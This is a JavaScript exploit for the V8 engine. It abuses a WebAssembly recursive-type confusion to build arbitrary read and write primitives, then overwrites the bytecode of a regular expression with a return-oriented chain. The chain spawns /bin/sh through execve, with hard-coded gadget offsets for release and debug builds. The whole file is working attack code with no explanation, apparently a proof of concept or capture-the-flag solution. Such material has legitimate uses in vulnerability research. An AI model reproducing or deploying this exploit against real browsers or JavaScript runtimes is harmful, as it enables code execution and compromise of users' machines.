const RELEASE = true;

let fi_buf = new ArrayBuffer(8); // shared buffer for float and bigint
let f_buf = new Float64Array(fi_buf); // buffer for float
let i_buf = new BigUint64Array(fi_buf); // buffer for bigint

// convert float to bigint
function ftoi(f) {
    f_buf[0] = f;
    return i_buf[0];
}

// convert bigint to float
function itof(i) {
    i_buf[0] = i;
    return f_buf[0];
}

// convert (big)int to hex string
function hex(i) {
    return `0x${i.toString(16)}`;
}


const kV8MaxWasmTypes = 1000000;
const kNone = kV8MaxWasmTypes + 13;

d8.file.execute("wasm-module-builder.js");

const builder = new WasmModuleBuilder();

let i32 = builder.addStruct([makeField(kWasmI32, true)]);
let i32ref = builder.addStruct([makeField(wasmRefType(i32), true)]);
let i32ref2 = builder.addStruct([makeField(wasmRefType(i32ref), true)]);

console.log("[+] Adding recursive group...");
builder.startRecGroup();
for (let i = 3; i < kV8MaxWasmTypes; i++) {
    builder.addType(makeSig([], []));
}
builder.endRecGroup();

for (let i = kV8MaxWasmTypes; i < kNone; i++) {
    builder.addType(makeSig([], []));
}
let anyref = builder.addStruct([makeField(kWasmAnyRef, true)]);

// get (compressed) address of object
builder.addFunction("addrof", makeSig([kWasmAnyRef], [kWasmI32]))
    .addBody([
        kExprLocalGet, 0, // obj
        kGCPrefix, kExprStructNew, ...wasmSignedLeb(anyref), // &obj
        kGCPrefix, kExprRefCast, i32, // &addr
        kGCPrefix, kExprStructGet, i32, 0, // addr
    ])
    .exportFunc();

// read 4-byte from (compressed) address
builder.addFunction("read4", makeSig([kWasmI32], [kWasmI32]))
    .addBody([
        kExprLocalGet, 0, // addr
        kExprI32Const, 8,
        kExprI32Sub,
        kGCPrefix, kExprStructNew, i32, // &addr
        kGCPrefix, kExprStructNew, ...wasmSignedLeb(anyref), // &&addr
        kGCPrefix, kExprRefCast, i32ref2, // &&addr
        kGCPrefix, kExprStructGet, i32ref2, 0, // &addr
        kGCPrefix, kExprStructGet, i32ref, 0, // addr
        kGCPrefix, kExprStructGet, i32, 0, // *addr
    ])
    .exportFunc();

// write 4-byte to (compressed) address
builder.addFunction("write4", makeSig([kWasmI32, kWasmI32], []))
    .addBody([
        kExprLocalGet, 0, // addr
        kExprI32Const, 8,
        kExprI32Sub,
        kGCPrefix, kExprStructNew, i32, // &addr
        kGCPrefix, kExprStructNew, ...wasmSignedLeb(anyref), // &&addr
        kGCPrefix, kExprRefCast, i32ref2, // &&addr
        kGCPrefix, kExprStructGet, i32ref2, 0, // &addr
        kGCPrefix, kExprStructGet, i32ref, 0, // addr
        kExprLocalGet, 1, // value
        kGCPrefix, kExprStructSet, i32, 0, // *addr = value
    ])
    .exportFunc();

console.log("[+] Building wasm module...");
let instance = builder.instantiate();
let addrof = instance.exports.addrof;
let read4 = instance.exports.read4;
let write4 = instance.exports.write4;


let re = /.*/;

let re_addr = addrof(re);
console.log(`[+] re_addr == ${hex(re_addr)}`);

let data_addr = read4(re_addr + 0xc);
console.log(`[+] data_addr == ${hex(data_addr)}`);

// generate bytecode
console.log("[+] Generating bytecode...");
re.exec();

let bytecode_addr = read4(data_addr + 0x1c);
console.log(`[+] bytecode_addr == ${hex(bytecode_addr)}`);


// bytecodes
const PUSH_REGISTER = 3;
const SET_REGISTER = 8;
const ADVANCE_REGISTER = 9;
const POP_REGISTER = 12;
const SUCCEED = 14;

let bytecode_arr = [];

function push(idx) {
    bytecode_arr.push(idx << 8 | PUSH_REGISTER);
}

function set(idx, value) {
    bytecode_arr.push(idx << 8 | SET_REGISTER);
    bytecode_arr.push(value);
}

function add(idx, value) {
    bytecode_arr.push(idx << 8 | ADVANCE_REGISTER);
    bytecode_arr.push(value);
}

function pop(idx) {
    bytecode_arr.push(idx << 8 | POP_REGISTER);
}

function succeed() {
    bytecode_arr.push(SUCCEED);
}

function mov(to_idx, from_idx) {
    push(from_idx);
    pop(to_idx);
}

// command to execute - /bin/sh
let cmd = [0x6e69622f, 0x0068732f];

// register index of return address
let idx = RELEASE ? 82 : 72;

// get binary base address
mov(0, idx);
mov(1, idx + 1);
add(0, RELEASE ? -0xa27cc0 : -0x733cf27);

// get stack address (address of registers)
mov(2, idx - 2);
mov(3, idx - 1);
add(2, RELEASE ? -0x200 : -0x248);

// write command to stack
for (let i = 0; i < cmd.length; i++) {
    set(4 + i, cmd[i]);
}

// pop rdi; ret
mov(idx, 0);
mov(idx + 1, 1);
add(idx, RELEASE ? 0x108313d : 0x8266f1d);

// rdi == command
mov(idx + 2, 2);
mov(idx + 3, 3);
add(idx + 2, 0x10);

// pop rsi; ret
mov(idx + 4, 0);
mov(idx + 5, 1);
add(idx + 4, RELEASE ? 0xd8131e : 0xabc397e);

// rsi == 0
set(idx + 6, 0);
set(idx + 7, 0);

// pop rdx; ret
mov(idx + 8, 0);
mov(idx + 9, 1);
add(idx + 8, RELEASE ? 0xb95fc4 : 0x8e5b702);

// rdx == 0
set(idx + 10, 0);
set(idx + 11, 0);

// pop rax; ret
mov(idx + 12, 0);
mov(idx + 13, 1);
add(idx + 12, RELEASE ? 0x11a0874 : 0x740f95b);

// rax == 0x3b (execve)
set(idx + 14, 0x3b);
set(idx + 15, 0);

// syscall => execve(command, 0, 0)
mov(idx + 16, 0);
mov(idx + 17, 1);
add(idx + 16, RELEASE ? 0x16d11f0 : 0xade418e);

// end
succeed();

// overwrite bytecode
console.log("[+] Overwriting bytecode...");
for (let i = 0; i < bytecode_arr.length; i++) {
    write4(bytecode_addr + 8 + i * 4, bytecode_arr[i]);
}

write4(data_addr + 0x30, 0x2); // set tier-up ticks to 1 => prevent tier-up on next execution

// execute bytecode
console.log("[+] Executing bytecode...");
re.exec("");
